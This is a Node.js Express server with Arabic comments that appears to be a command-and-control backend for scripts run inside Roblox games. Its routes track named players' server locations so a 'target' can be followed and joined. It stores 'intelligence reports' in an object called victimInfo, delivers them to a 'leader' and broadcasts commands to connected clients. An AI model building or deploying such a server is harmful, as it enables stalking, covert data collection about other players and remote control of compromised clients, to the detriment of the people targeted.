const express = require('express');
const cors = require('cors');
const app = express();

// إعدادات الوصول والأمان
app.use(cors());
app.use(express.json());
app.options('*', cors());

// مخازن البيانات في الذاكرة (Memory Storage)
let activePlayers = {}; // لتتبع المتواجدين حالياً
let chatData = { username: "System", message: "No Command", time: Date.now() };
let victimInfo = {}; // لتخزين التقارير الاستخباراتية

// ==========================================
// [1] استقبال الإشارات (Ping) - تحديث الموقع والنشاط
// ==========================================
app.post('/ping', (req, res) => {
    try {
        const { username, placeId, jobId } = req.body;
        if (username) {
            activePlayers[username] = {
                placeId: placeId,
                jobId: jobId,
                lastSeen: Date.now()
            };
            console.log(`📡 [PING] ${username} نشط الآن في السيرفر.`);
        }
        res.json({ status: "updated", serverTime: Date.now() });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// ==========================================
// [2] مسار الانضمام (Target Info) - الحل الجذري لمشكلة Join
// ==========================================
app.get('/target_info', (req, res) => {
    try {
        const target = req.query.username;
        const data = activePlayers[target];
        const now = Date.now();

        // فحص: هل اللاعب موجود وهل أرسل Ping خلال آخر 30 ثانية؟
        if (data && (now - data.lastSeen < 30000)) {
            console.log(`🔗 [JOIN] إرسال إحداثيات السيرفر للهدف: ${target}`);
            res.json({
                placeId: data.placeId,
                jobId: data.jobId,
                status: "online"
            });
        } else {
            console.log(`⚠️ [JOIN] محاولة لحاق بفاشلة: ${target} غير متصل.`);
            res.status(404).json({ error: "Target offline" });
        }
    } catch (error) {
        res.status(500).json({ error: "Search failed" });
    }
});

// ==========================================
// [3] استقبال تقارير النظام (Info Report)
// ==========================================
app.post('/info', (req, res) => {
    try {
        const { username, data } = req.body;
        if (username && data) {
            victimInfo[username] = {
                ...data,
                receivedAt: Date.now()
            };
            console.log(`📊 [INFO] تم استلام تقرير كامل عن: ${username}`);
            res.json({ status: "success" });
        }
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

// ==========================================
// [4] جلب المعلومات للقائد (GetInfo)
// ==========================================
app.get('/getinfo', (req, res) => {
    const username = req.query.username;
    const info = victimInfo[username];
    
    if (info) {
        console.log(`📤 [DATA] تسليم بيانات ${username} للقائد.`);
        res.json({ status: "success", data: info });
        // تنظيف البيانات بعد التسليم لضمان الخصوصية
        delete victimInfo[username]; 
    } else {
        res.status(404).json({ status: "not_found" });
    }
});

// ==========================================
// [5] تحديث الأوامر وقائمة اللاعبين
// ==========================================
app.post('/update', (req, res) => {
    const { username, message } = req.body;
    if (username && message) {
        chatData = { username, message, time: Date.now() };
        console.log(`👑 [CMD] أمر جديد: ${message}`);
        res.json({ status: "sent" });
    }
});

app.get('/players', (req, res) => {
    const now = Date.now();
    // تصفية اللاعبين النشطين فقط (أقل من 20 ثانية ظهور)
    const onlineList = Object.keys(activePlayers)
        .filter(user => (now - activePlayers[user].lastSeen) < 20000);
    res.json(onlineList);
});

app.get('/data', (req, res) => res.json(chatData));

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n==========================================`);
    console.log(`🚀 704_TM ULTIMATE SERVER IS READY`);
    console.log(`📡 PORT: ${PORT} | STATUS: ACTIVE`);
    console.log(`==========================================\n`);
});
